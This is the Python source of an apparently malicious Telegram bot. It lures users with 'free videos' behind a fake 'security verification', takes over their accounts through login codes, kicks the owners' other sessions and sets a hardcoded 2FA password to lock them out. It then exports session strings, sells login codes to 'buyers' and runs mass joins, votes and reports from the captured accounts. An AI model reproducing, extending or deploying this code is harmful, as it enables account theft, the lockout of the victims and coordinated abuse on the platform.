import asyncio
import os
import re
import random
import shutil
import zipfile
import datetime
import tempfile
import json
import pyzipper
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from aiogram import types, F, Router
from aiogram.filters import CommandStart, Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, URLInputFile
from telethon.tl import types as tl_types

from DivoSource.fsm import (
    AddAccountState, JoinState, LeaveState, InviteState, Disable2FAState, Enable2FAState,
    Change2FAState, AddSellerState, RemoveResellerState, AddBuyerState, RemoveBuyerState,
    ReportState, ReportUserState, SessionState, TransferState, FetchToFileState,
    EditAccountState, YastahaqqVoteState, NormalVoteState, ReactionState, BackupState,
    LoginEmailState, UserLoginState
)
from DivoSource.accounts import send_code, verify_code, advanced_clear_sessions, clean_service_messages, setup_2fa
from DivoSource.database import (
    get_accounts, is_reseller, add_reseller, remove_reseller, get_all_resellers,
    delete_account_from_db, add_account, is_buyer, add_buyer, remove_buyer,
    get_all_buyers, get_buyer_info, increment_buyer_pulls, get_seller_stats,
    get_or_create_user_stats, update_last_video_date, consume_extra_video, record_referral, reward_referrer_if_any
)
from DivoSource.tasks import (
    get_code_for_phone_task, check_status_task, check_email_task, join_channel_task,
    leave_channel_task, disable_2fa_task, enable_2fa_task, change_2fa_task,
    start_bot_task, report_peer_task, report_user_task, clear_other_sessions_task,
    terminate_account_session_task, clear_all_sessions_task, count_sessions_task,
    delete_inactive_accounts_task, init_change_login_email_task, confirm_change_login_email_task
)
from DivoSource.email_utils import fetch_telegram_code, generate_dot_variant
import config
from DivoSource.edit_tasks import (
    edit_first_name_task, edit_last_name_task, edit_username_task,
    delete_username_task, edit_bio_task, delete_bio_task,
    add_photo_task, delete_photo_task, add_story_task
)
from config import OWNER_ID, SESSIONS_DIR
from DivoSource.logger import logger
from DivoSource.sessions import generate_pyrogram_string, generate_telethon_string
from DivoSource.accounts import get_client
from DivoSource.utils import format_header, format_separator

router = Router()

VIDEOS_FILE = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "videos.txt")

_background_tasks = set()

def spawn_background_task(coro):
    task = asyncio.create_task(coro)
    _background_tasks.add(task)
    task.add_done_callback(_background_tasks.discard)
    return task

async def delete_after_delay(msg: types.Message, delay: int = 900):
    """حذف الرسالة بعد فترة محددة بالثواني (15 دقيقة = 900 ثانية)"""
    await asyncio.sleep(delay)
    try:
        await msg.delete()
    except Exception as e:
        logger.warning(f"فشل حذف رسالة الميديا المؤقتة: {e}")

async def send_random_video(message: types.Message, reply_markup=None):
    """إرسال ميديا عشوائية (فيديو أو صورة) مشوشة (Spoiler) وحذفها بعد 15 دقيقة"""
    try:
        if not os.path.exists(VIDEOS_FILE):
            return
        with open(VIDEOS_FILE, "r", encoding="utf-8") as f:
            links = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
        if not links:
            return
        chosen = random.choice(links)
        chosen_lower = chosen.lower()
        
        sent_msg = None
        is_url = chosen.startswith("http://") or chosen.startswith("https://")
        
        # تصنيف الميديا حسب الامتداد لتجنب أخطاء تليجرام
        is_image = any(chosen_lower.endswith(ext) for ext in ['.jpg', '.jpeg', '.png', '.gif', '.webp'])
        is_video = any(chosen_lower.endswith(ext) for ext in ['.mp4', '.mov', '.avi', '.m4v', '.3gp', '.flv'])
        
        if is_image:
            try:
                # استخدام URLInputFile لتنزيل الصورة ورفعها مباشرة بواسطة البوت
                media = URLInputFile(chosen) if is_url else chosen
                sent_msg = await message.reply_photo(photo=media, has_spoiler=True, reply_markup=reply_markup)
            except Exception as e_photo:
                logger.warning(f"فشل إرسال الميديا كصورة عبر URLInputFile: {e_photo}")
                # محاولة الإرسال كخام احتياطياً
                try:
                    sent_msg = await message.reply_photo(photo=chosen, has_spoiler=True, reply_markup=reply_markup)
                except Exception:
                    pass
        elif is_video:
            try:
                # استخدام URLInputFile لتنزيل الفيديو ورفعه مباشرة بواسطة البوت
                media = URLInputFile(chosen) if is_url else chosen
                sent_msg = await message.reply_video(video=media, has_spoiler=True, reply_markup=reply_markup)
            except Exception as e_video:
                logger.warning(f"فشل إرسال الميديا كفيديو عبر URLInputFile: {e_video}")
                # محاولة الإرسال كخام احتياطياً
                try:
                    sent_msg = await message.reply_video(video=chosen, has_spoiler=True, reply_markup=reply_markup)
                except Exception:
                    pass
                
        # محاولة أخيرة ذكية إذا لم يتطابق الامتداد أو فشل الإرسال المصنف
        if not sent_msg:
            try:
                media = URLInputFile(chosen) if is_url else chosen
                sent_msg = await message.reply_video(video=media, has_spoiler=True, reply_markup=reply_markup)
            except Exception:
                try:
                    sent_msg = await message.reply_photo(photo=media, has_spoiler=True, reply_markup=reply_markup)
                except Exception:
                    try:
                        sent_msg = await message.answer(chosen, reply_markup=reply_markup)
                    except Exception:
                        pass
        
        # جدولة حذف الرسالة بعد 15 دقيقة (900 ثانية)
        if sent_msg:
            spawn_background_task(delete_after_delay(sent_msg, 900))
            
    except Exception as e:
        logger.warning(f"فشل إرسال الميديا العشوائية: {e}")

def get_main_keyboard(user_id: int, is_buyer_user: bool = False):
    if user_id == OWNER_ID:
        btns = [
            [InlineKeyboardButton(text="🚀 بوابة النقل", callback_data="sec_transfer")],
            [InlineKeyboardButton(text="📱 قسم الحسابات", callback_data="sec_accounts"), InlineKeyboardButton(text="⚙️ قسم التحكم", callback_data="sec_control")],
            [InlineKeyboardButton(text="📢 قسم الإبلاغات", callback_data="sec_reports"), InlineKeyboardButton(text="📂 قسم الجلسات", callback_data="sec_sessions")],
            [InlineKeyboardButton(text="🔐 إدارة التحقق بخطوتين", callback_data="manage_2fa")],
            [InlineKeyboardButton(text="👥 إدارة البيع والشراء", callback_data="manage_sales")],
            [InlineKeyboardButton(text="🗳 قسم التصويت", callback_data="sec_voting"), InlineKeyboardButton(text="🎭 قسم التفاعل", callback_data="sec_reaction")],
            [InlineKeyboardButton(text="💾 إدارة النسخ الاحتياطي", callback_data="sec_backup")]
        ]
    elif is_buyer_user:
        btns = [
            [InlineKeyboardButton(text="🔑 سحب كود", callback_data="pull_code")]
        ]
    else:
        btns = [
            [InlineKeyboardButton(text="➕ إضافة حساب", callback_data="add")]
        ]
    return InlineKeyboardMarkup(inline_keyboard=btns)

def get_accounts_keyboard():
    btns = [
        [InlineKeyboardButton(text="➕ إضافة حساب", callback_data="add"), InlineKeyboardButton(text="🗑 حذف حساب", callback_data="del")],
        [InlineKeyboardButton(text="🔑 جلب الأكواد", callback_data="get_codes"), InlineKeyboardButton(text="🔍 فحص الحسابات", callback_data="chk")],
        [InlineKeyboardButton(text="📥 تصدير الجلسات", callback_data="export"), InlineKeyboardButton(text="📤 استيراد الجلسات", callback_data="import_sessions")],
        [InlineKeyboardButton(text="✏️ تعديل حساب", callback_data="edit_account"), InlineKeyboardButton(text="📋 عرض الأرقام", callback_data="numbers")],
        [InlineKeyboardButton(text="📊 فحص الجلسات", callback_data="chk_sessions"), InlineKeyboardButton(text="🧹 حذف المتوقف", callback_data="del_inactive")],
        [InlineKeyboardButton(text="🧹 تفريغ جلسات رقم", callback_data="branch_sessions"), InlineKeyboardButton(text="🔥 تفريغ جلسات الكل", callback_data="clear_all_sessions")],
        [InlineKeyboardButton(text="🔙 رجوع", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=btns)

async def import_sessions_archive(archive_path: str):
    imported_phones = []
    skipped_files = []
    found_session_files = False

    with tempfile.TemporaryDirectory() as temp_dir:
        try:
            with zipfile.ZipFile(archive_path, "r") as zipf:
                zipf.extractall(temp_dir)
        except zipfile.BadZipFile:
            return False, "الملف المرفوع ليس أرشيف ZIP صالح.", imported_phones, skipped_files

        for root, _, files in os.walk(temp_dir):
            for file_name in files:
                if not file_name.endswith(".session"):
                    continue

                found_session_files = True
                source_path = os.path.join(root, file_name)
                target_path = os.path.join(SESSIONS_DIR, file_name)
                session_name = os.path.splitext(file_name)[0]
                client = None
                phone = None

                try:
                    shutil.copy2(source_path, target_path)
                    client = await get_client("", session_name)
                    await client.connect()
                    if await client.is_user_authorized():
                        # استخدام نظام الطرد المتقدم عند الاستيراد
                        await advanced_clear_sessions(client, "Imported Session", force_kick=True)
                        
                        # تفعيل التحقق وتنسيق الجلسة
                        from DivoSource.accounts import setup_2fa, clean_service_messages, get_account_email
                        await setup_2fa(client, "MR_Divo@2004a")
                        await clean_service_messages(client)
                        
                        me = await client.get_me()
                        if me and me.phone:
                            phone = f"+{me.phone}"
                            
                        # حفظ البريد في قاعدة البيانات
                        email = await get_account_email(client, "MR_Divo@2004a")
                        from DivoSource.database import update_account_email
                        await update_account_email(phone, email)
                        
                        # تنظيف نهائي
                        await asyncio.sleep(1)
                        await clean_service_messages(client)
                except Exception as e:
                    logger.warning(f"تعذر استخراج الرقم من داخل الجلسة {file_name}: {e}")
                finally:
                    try:
                        if client is not None:
                            await client.disconnect()
                    except Exception:
                        pass

                if not phone:
                    match = re.fullmatch(r"session_(\d+)", session_name)
                    if match:
                        phone = f"+{match.group(1)}"

                try:
                    if not phone:
                        skipped_files.append(file_name)
                        continue

                    await add_account(phone, session_name)
                    imported_phones.append(phone)
                except Exception as e:
                    logger.error(f"خطأ أثناء استيراد الجلسة {file_name}: {e}")
                    skipped_files.append(file_name)

    if not found_session_files:
        return False, "الملف لا يحتوي على أي ملفات جلسات بصيغة .session.", imported_phones, skipped_files

    if not imported_phones and skipped_files:
        return False, "لم يتم استيراد أي جلسة من الملف المرفوع.", imported_phones, skipped_files

    return True, "تمت معالجة ملف الجلسات بنجاح.", imported_phones, skipped_files

def get_control_keyboard():
    btns = [
        [InlineKeyboardButton(text="✅ انضمام جماعي", callback_data="join"), InlineKeyboardButton(text="❌ مغادرة جماعية", callback_data="leave")],
        [InlineKeyboardButton(text="▶️ استارت في بوت", callback_data="start_in_bot"), InlineKeyboardButton(text="🔗 تفعيل رابط دعوة", callback_data="invite")],
        [InlineKeyboardButton(text="🔙 رجوع", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=btns)

def get_report_keyboard():
    btns = [
        [InlineKeyboardButton(text="📢 ابلاغ عن قناه", callback_data="rep_channel"), InlineKeyboardButton(text="👥 ابلاغ عن جروب", callback_data="rep_group")],
        [InlineKeyboardButton(text="👤 ابلاغ عن حساب", callback_data="rep_user")],
        [InlineKeyboardButton(text="🔙 رجوع", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=btns)

def get_report_types_keyboard():
    btns = [
        [InlineKeyboardButton(text="Spam / سبام", callback_data="type_spam"), InlineKeyboardButton(text="Violence / عنف", callback_data="type_violence")],
        [InlineKeyboardButton(text="Porn / غير لائق", callback_data="type_porn"), InlineKeyboardButton(text="Child Abuse / أطفال", callback_data="type_child")],
        [InlineKeyboardButton(text="Copyright / حقوق", callback_data="type_copyright"), InlineKeyboardButton(text="Other / آخر", callback_data="type_other")],
        [InlineKeyboardButton(text="🔙 إلغاء", callback_data="sec_reports")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=btns)

def get_sessions_keyboard():
    btns = [
        [InlineKeyboardButton(text="بايوجرام (Pyrogram)", callback_data="ses_pyrogram"), InlineKeyboardButton(text="تلثون (Telethon)", callback_data="ses_telethon")],
        [InlineKeyboardButton(text="🔙 رجوع", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=btns)

def get_backup_keyboard():
    btns = [
        [InlineKeyboardButton(text="📥 جلب نسخة احتياطية", callback_data="backup_export")],
        [InlineKeyboardButton(text="📤 رفع نسخة احتياطية", callback_data="backup_import")],
        [InlineKeyboardButton(text="🔙 رجوع", callback_data="main_menu")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=btns)

def get_2fa_scope_keyboard(action: str):
    btns = [
        [InlineKeyboardButton(text="📱 رقم محدد", callback_data=f"2fa_scope_{action}_single")],
        [InlineKeyboardButton(text="👥 كل الحسابات", callback_data=f"2fa_scope_{action}_all")],
        [InlineKeyboardButton(text="🔙 رجوع", callback_data="manage_2fa")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=btns)

def get_2fa_target_keyboard(action: str, accounts):
    btns = [[InlineKeyboardButton(text=acc[0].replace('+', ''), callback_data=f"2fa_target_{action}_{acc[0]}")] for acc in accounts if acc[2] == "active"]
    btns.append([InlineKeyboardButton(text="🔙 رجوع", callback_data="manage_2fa")])
    return InlineKeyboardMarkup(inline_keyboard=btns)


@router.callback_query(F.data == "main_menu")
async def main_menu_handler(call: types.CallbackQuery):
    is_buyer_user = await is_buyer(call.from_user.id)
    text = f"<blockquote>◉╮ 👑 القائمة الرئيسية\n◉᚜┃ مرحباً بك في مدير الحسابات المتطور.\n◉╯ اختر من القائمة أدناه:</blockquote>"
    await call.message.edit_text(text, reply_markup=get_main_keyboard(call.from_user.id, is_buyer_user), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "sec_accounts")
async def sec_accounts_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    await call.message.edit_text("<blockquote>◉╮ 📱 قسم الحسابات\n◉╯ اختر العملية المطلوبة:</blockquote>", reply_markup=get_accounts_keyboard(), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "sec_control")
async def sec_control_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    await call.message.edit_text("<blockquote>◉╮ ⚙️ قسم التحكم\n◉╯ اختر العملية المطلوبة:</blockquote>", reply_markup=get_control_keyboard(), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "sec_reports")
async def sec_reports_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    await call.message.edit_text("<blockquote>◉╮ 📢 قسم الإبلاغات\n◉╯ اختر نوع الإبلاغ:</blockquote>", reply_markup=get_report_keyboard(), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "sec_sessions")
async def sec_sessions_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    await call.message.edit_text("<blockquote>◉╮ 📂 قسم الجلسات\n◉╯ اختر نوع الجلسة التي تريد استخراجها:</blockquote>", reply_markup=get_sessions_keyboard(), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "sec_backup")
async def sec_backup_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    text = "<blockquote>◉╮ 💾 إدارة النسخ الاحتياطي\n◉╯ اختر العملية المطلوبة من القائمة أدناه:</blockquote>"
    await call.message.edit_text(text, reply_markup=get_backup_keyboard(), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data == "backup_export")
async def backup_export_handler(call: types.CallbackQuery):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    await call.message.edit_text("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري تحضير النسخة الاحتياطية وتشفيرها...</blockquote>", parse_mode="HTML")
    
    zip_path = "Divo_Source.zip"
    try:
        accs = await get_accounts()
        accounts_data = []
        for acc in accs:
            accounts_data.append({
                "phone": acc[0],
                "session_name": acc[1],
                "status": acc[2],
                "proxy": acc[3],
                "twofa_password": acc[4]
            })
        
        json_data = json.dumps(accounts_data, ensure_ascii=False, indent=4)
        
        with pyzipper.AESZipFile(zip_path, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zipf:
            zipf.pwd = b'MR_Divo@2004'
            zipf.writestr("accounts.json", json_data)
            
            session_count = 0
            for root, dirs, files in os.walk(SESSIONS_DIR):
                for file in files:
                    if file.endswith(".session"):
                        zipf.write(os.path.join(root, file), file)
                        session_count += 1
                        
        doc = FSInputFile(zip_path)
        file_size_kb = os.path.getsize(zip_path) / 1024
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        report = (
            f"<blockquote>◉╮ 💾 النسخة الاحتياطية\n"
            f"◉᚜┃ ✅ تم الإنشاء بنجاح\n"
            f"◉᚜┃ 👥 الحسابات: {len(accounts_data)}\n"
            f"◉᚜┃ 📂 الجلسات: {session_count}\n"
            f"◉᚜┃ 📦 الحجم: {file_size_kb:.2f} KB\n"
            f"◉╯ ⏰ الوقت: {current_time}</blockquote>"
        )
        await call.message.answer_document(doc, caption=report, parse_mode="HTML")
        await call.message.edit_text("<blockquote>◉╮ ✅ تم بنجاح\n◉╯ اكتملت عملية التصدير بنجاح.</blockquote>", reply_markup=get_backup_keyboard(), parse_mode="HTML")
    except Exception as e:
        logger.error(f"خطأ أثناء تصدير النسخة الاحتياطية: {e}")
        await call.message.edit_text(f"<blockquote>◉╮ ❌ فشل التصدير\n◉╯ حدث خطأ أثناء التصدير:\n◉╯ {e}</blockquote>", reply_markup=get_backup_keyboard(), parse_mode="HTML")
    finally:
        if os.path.exists(zip_path):
            os.remove(zip_path)
    await call.answer()

@router.callback_query(F.data == "backup_import")
async def backup_import_start_handler(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض", show_alert=True)
    await state.set_state(BackupState.waiting_for_backup_file)
    await call.message.edit_text("<blockquote>◉╮ 📥 استعادة النسخة\n◉᚜┃ أرسل الآن ملف <code>Divo_Source.zip</code> لاستعادة الحسابات.\n◉╯ يجب أن يكون الملف مشفراً بكلمة المرور الافتراضية.</blockquote>", parse_mode="HTML")
    await call.answer()

@router.message(BackupState.waiting_for_backup_file, F.document)
async def backup_import_file_handler(message: types.Message, state: FSMContext):
    if message.from_user.id != OWNER_ID: return
    document = message.document
    if not document.file_name.lower().endswith(".zip"):
        await message.answer("<blockquote>◉╮ ❌ خطأ في الملف\n◉╯ الملف يجب أن يكون بصيغة ZIP.</blockquote>", parse_mode="HTML")
        return

    safe_file_name = os.path.basename(document.file_name)
    archive_path = os.path.join(SESSIONS_DIR, f"backup_{safe_file_name}")
    await message.answer("<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري رفع الملف وفك تشفيره لاستيراد الحسابات...</blockquote>", parse_mode="HTML")

    try:
        await message.bot.download(document, destination=archive_path)
        
        imported_count = 0
        duplicate_count = 0
        failed_count = 0
        total_in_backup = 0
        
        with tempfile.TemporaryDirectory() as temp_dir:
            try:
                with pyzipper.AESZipFile(archive_path, 'r') as zipf:
                    zipf.pwd = b'MR_Divo@2004'
                    zipf.extractall(temp_dir)
            except RuntimeError as e:
                if 'Bad password' in str(e):
                    await message.answer("<blockquote>◉╮ ❌ خطأ في الاستعادة\n◉╯ كلمة مرور الملف غير صحيحة، أو الملف ليس من نوع النسخ الاحتياطي الخاص بالبوت.</blockquote>", parse_mode="HTML")
                    return
                else:
                    raise e
            except pyzipper.zipfile.BadZipFile:
                await message.answer("<blockquote>◉╮ ❌ خطأ في الملف\n◉╯ الملف المرفوع ليس أرشيف ZIP صالح.</blockquote>", parse_mode="HTML")
                return

            accounts_json_path = os.path.join(temp_dir, "accounts.json")
            if not os.path.exists(accounts_json_path):
                await message.answer("<blockquote>◉╮ ❌ خطأ في النسخة\n◉╯ ملف accounts.json غير موجود داخل النسخة. لا يمكن استعادة الحسابات.</blockquote>", parse_mode="HTML")
                return
                
            with open(accounts_json_path, 'r', encoding='utf-8') as f:
                accounts_data = json.load(f)
                total_in_backup = len(accounts_data)

            current_accounts = await get_accounts()
            current_phones = {acc[0] for acc in current_accounts}
            
            for acc in accounts_data:
                phone = acc.get("phone")
                session_name = acc.get("session_name")
                if not phone or not session_name:
                    failed_count += 1
                    continue
                
                if phone in current_phones:
                    duplicate_count += 1
                    continue
                
                session_file_path = os.path.join(temp_dir, f"{session_name}.session")
                if os.path.exists(session_file_path):
                    target_session_path = os.path.join(SESSIONS_DIR, f"{session_name}.session")
                    try:
                        shutil.copy2(session_file_path, target_session_path)
                        await add_account(
                            phone, 
                            session_name, 
                            proxy=acc.get("proxy"), 
                            twofa_password=acc.get("twofa_password"),
                            added_by=acc.get("added_by")
                        )
                        imported_count += 1
                    except Exception as e:
                        logger.error(f"Failed to import account {phone}: {e}")
                        failed_count += 1
                else:
                    logger.warning(f"Session file for {phone} not found in backup.")
                    failed_count += 1

        report = (
            f"<blockquote>◉╮ 📥 استيراد النسخة الاحتياطية\n"
            f"◉᚜┃ ✅ تم الاستيراد بنجاح\n"
            f"◉᚜┃ 📋 الإجمالي بالنسخة: {total_in_backup}\n"
            f"◉᚜┃ ➕ تمت إضافته: {imported_count}\n"
            f"◉᚜┃ ♻️ حسابات مكررة: {duplicate_count}\n"
            f"◉╯ ❌ فشل: {failed_count}</blockquote>"
        )
        await message.answer(report, parse_mode="HTML")
        await message.answer("<blockquote>◉╮ 💾 القائمة\n◉╯ اختر من القائمة أدناه:</blockquote>", reply_markup=get_backup_keyboard(), parse_mode="HTML")
    except Exception as e:
        logger.error(f"خطأ أثناء استيراد النسخة الاحتياطية: {e}")
        await message.answer(f"<blockquote>◉╮ ❌ خطأ\n◉╯ حدث خطأ أثناء استعادة النسخة:\n◉╯ {e}</blockquote>", parse_mode="HTML")
    finally:
        if os.path.exists(archive_path):
            os.remove(archive_path)
        await state.clear()

@router.message(BackupState.waiting_for_backup_file)
async def backup_import_invalid_handler(message: types.Message):
    await message.answer("<blockquote>◉╮ 📎 إرسال نسخة\n◉╯ الرجاء إرسال ملف ZIP الخاص بالنسخة الاحتياطية.</blockquote>", parse_mode="HTML")

@router.message(CommandStart())
async def start_handler(message: types.Message, state: FSMContext, command: CommandObject):
    is_buyer_user = await is_buyer(message.from_user.id)
    is_authorized = (message.from_user.id == OWNER_ID or 
                     await is_reseller(message.from_user.id) or 
                     is_buyer_user)
    if not is_authorized:
        # تسجيل الإحالة إذا دخل المستخدم عبر رابط إحالة
        # استخدام CommandObject لقراءة الـ payload بشكل صحيح (الطريقة الرسمية في aiogram 3)
        payload = command.args  # يعطي كل ما بعد /start مباشرة
        if payload and payload.startswith("ref_"):
            referrer_id = payload[4:]  # إزالة "ref_" من البداية
            if referrer_id and referrer_id.isdigit():
                await record_referral(str(message.from_user.id), referrer_id)

        user_accounts_count = await get_seller_stats(str(message.from_user.id))
        if user_accounts_count > 0:
            user_mention = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>'
            inline_keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎬 فيديو", callback_data="get_user_random_video")]
            ])
            await message.answer(
                f"<blockquote>👋 أهلاً بك مجدداً {user_mention}\n\n"
                f"اضغط على الزر بالأسفل للحصول على فيديو عشوائي ممتع. ✨</blockquote>",
                reply_markup=inline_keyboard,
                parse_mode="HTML"
            )
            return
            
        keyboard = types.ReplyKeyboardMarkup(
            keyboard=[
                [types.KeyboardButton(text="التحقق ✅", request_contact=True)]
            ],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        user_mention = f'<a href="tg://user?id={message.from_user.id}">{message.from_user.full_name}</a>'
        sent_msg = await message.answer(
            f"<blockquote>👋 أهلاً بك {user_mention}\n\n"
            f"🎬 للوصول إلى جميع <b>الفيديوهات المجانية</b>\n"
            f"يُرجى إكمال التحقق الأمني أولًا.\n\n"
            f"🔹 اضغط على زر <b>«التحقق»</b> بالأسفل\n"
            f"🔹 بعد نجاح التحقق سيتم منحك الوصول\n"
            f"　　إلى المحتوى المجاني مباشرة\n\n"
            f"✨ شكرًا لتعاونك</blockquote>",
            reply_markup=keyboard,
            parse_mode="HTML"
        )
        await state.set_state(UserLoginState.waiting_for_contact)
        await state.update_data(start_msg_id=sent_msg.message_id)
        return
    text = "<blockquote>◉╮ 👑 القائمة الرئيسية\n◉᚜┃ مرحباً بك في مدير الحسابات المتطور.\n◉╯ اختر من القائمة أدناه:</blockquote>"
    await message.answer(text, reply_markup=get_main_keyboard(message.from_user.id, is_buyer_user), parse_mode="HTML")

@router.callback_query(F.data == "get_user_random_video")
async def get_user_random_video_callback(call: types.CallbackQuery):
    user_accounts_count = await get_seller_stats(str(call.from_user.id))
    if user_accounts_count == 0:
        await call.answer("⚠️ يجب عليك إكمال التحقق أولاً بالضغط على /start", show_alert=True)
        return
        
    # التحقق من الحدود اليومية
    today_str = datetime.date.today().isoformat()
    
    stats = await get_or_create_user_stats(str(call.from_user.id))
    
    # 1. إذا لم يشاهد الفيديو اليومي المجاني اليوم بعد
    if stats["last_video_date"] != today_str:
        await update_last_video_date(str(call.from_user.id), today_str)
        await call.answer("⏳ جاري تحضير الفيديو المجاني اليومي...")
        await send_random_video(call.message)
    # 2. إذا كان لديه فيديوهات إضافية متبقية من نظام الإحالة
    elif stats["extra_videos"] > 0:
        await consume_extra_video(str(call.from_user.id))
        await call.answer(f"⏳ جاري تحضير الفيديو الإضافي (متبقي لديك: {stats['extra_videos'] - 1})...")
        await send_random_video(call.message)
    # 3. إذا تجاوز الحد وليس لديه رصيد إضافي
    else:
        bot_info = await call.bot.get_me()
        invite_link = f"https://t.me/{bot_info.username}?start=ref_{call.from_user.id}"
        await call.answer("⚠️ لقد استهلكت حدك اليومي!", show_alert=True)
        await call.message.answer(
            f"<blockquote>⚠️ <b>عزيزي</b> {call.from_user.full_name}\n\n"
            f"لقد استهلكت حد الفيديو المجاني اليومي (1 فيديو/يوم).\n\n"
            f"🎁 <b>تريد مشاهدة المزيد؟</b>\n"
            f"انسخ رابط الإحالة الخاص بك وشاركه مع أصدقائك. لكل صديق جديد يسجل في البوت، ستحصل فوراً على <b>1 فيديو إضافي مجاني!</b>\n\n"
            f"🔗 رابط الإحالة الخاص بك:\n"
            f"<code>{invite_link}</code></blockquote>",
            parse_mode="HTML"
        )

@router.callback_query(F.data.startswith("ses_"))
async def session_type_handler(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    stype = call.data.split("_")[1]
    await state.update_data(stype=stype)
    
    accs = await get_accounts()
    if not accs:
        return await call.answer("لا يوجد حسابات مضافة.", show_alert=True)
    
    btns = [[InlineKeyboardButton(text=a[0], callback_data=f"getses_{a[0]}")] for a in accs]
    btns.append([InlineKeyboardButton(text="🔙 إلغاء", callback_data="sec_sessions")])
    
    await call.message.edit_text(f"<blockquote>◉╮ 📂 استخراج جلسة\n◉╯ اختر الرقم لاستخراج جلسة {stype.capitalize()} من القائمة:</blockquote>", reply_markup=InlineKeyboardMarkup(inline_keyboard=btns), parse_mode="HTML")
    await call.answer()

@router.callback_query(F.data.startswith("getses_"))
async def execute_get_session(call: types.CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return await call.answer("مرفوض")
    phone = call.data.split("_")[1]
    data = await state.get_data()
    stype = data.get("stype", "telethon")
    
    await call.message.edit_text(f"<blockquote>◉╮ ⏳ جاري العمل\n◉╯ جاري استخراج جلسة {stype} للرقم {phone}...</blockquote>", parse_mode="HTML")
    
    session_str = None
    if stype == "pyrogram":
        session_str = await generate_pyrogram_string(phone)
    else:
        session_str = await generate_telethon_string(phone)
        
    if session_str:
        await call.message.answer(f"<blockquote>◉╮ ✅ جلسة {stype.capitalize()}\n◉᚜┃ الرقم: {phone}\n◉╯ <code>{session_str}</code></blockquote>", parse_mode="HTML")
    else:
        await call.message.answer(f"<blockquote>◉╮ ❌ فشل الاستخراج\n◉╯ فشل استخراج الجلسة للرقم {phone}. تأكد من وجود ملف الجلسة.</blockquote>", parse_mode="HTML")
    
    await state.clear()
    await call.message.answer("<blockquote>◉╮ 📁 القائمة\n◉╯ اختر من القائمة أدناه:</blockquote>", reply_markup=get_sessions_keyboard(), parse_mode="HTML")
    await call.answer()



# ====== Add Account ======
@router.callback_query(F.data == "add")
async def add_account_start(call: types.CallbackQuery, state: FSMContext):
    await call.message.answer("<blockquote>◉╮ ➕ إضافة حساب\n◉╯ أرسل رقم الهاتف مع رمز الدولة (مثال: +123456789):</blockquote>", parse_mode="HTML")
    await call.answer()
    await state.set_state(AddAccountState.waiting_for_phone)

@router.message(AddAccountState.waiting_for_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    
    # التحقق من أن الرقم يحتوي على أرقام فقط بعد الزائد
    if not phone[1:].isdigit() or len(phone) < 8:
        await message.answer("<blockquote>◉╮ ❌ رقم غير صحيح\n◉╯ يرجى إرسال الرقم بشكل صحيح مع رمز الدولة (مثال: +20123456789).</blockquote>", parse_mode="HTML")
        return

    wait_msg = await message.answer("<blockquote>◉╮ 🔄 جاري العمل\n◉╯ جاري طلب الكود...</blockquote>", parse_mode="HTML")
    success, res = await send_code(phone)
    try: await wait_msg.delete()
    except Exception: pass
    if success:
         await state.update_data(phone=phone)
         await message.answer("<blockquote>◉╮ ✅ تم الإرسال\n◉╯ تم إرسال الكود. الرجاء إدخاله هنا:</blockquote>", parse_mode="HTML")
         await state.set_state(AddAccountState.waiting_for_code)
    else:
         await message.answer(f"<blockquote>◉╮ ❌ خطأ\n◉╯ حدث خطأ:\n◉╯ {res}</blockquote>", parse_mode="HTML")
         await state.clear()

async def automate_account_setup(message: types.Message, phone: str, phone_hash: str = None, password: str = None, silent: bool = False):
    """أتمتة تأمين الحساب (2FA + البريد) بشكل فوري وشامل مع إبلاغ المستخدم"""
    from telethon.tl.functions.account import SendVerifyEmailCodeRequest
    from telethon.tl import types as tl_types
    import config
    
    logger.info(f"🚀 بدء التأمين الفوري للحساب {phone}")
    
    # رسالة تتبع الحالة للمستخدم
    status_msg = None
    if not silent:
        status_msg = await message.answer(f"<blockquote>◉╮ 🛡️ تأمين فوري\n◉╯ جاري البدء في تأمين الحساب...</blockquote>", parse_mode="HTML")
    
    session_name = f"session_{phone.replace('+', '')}"
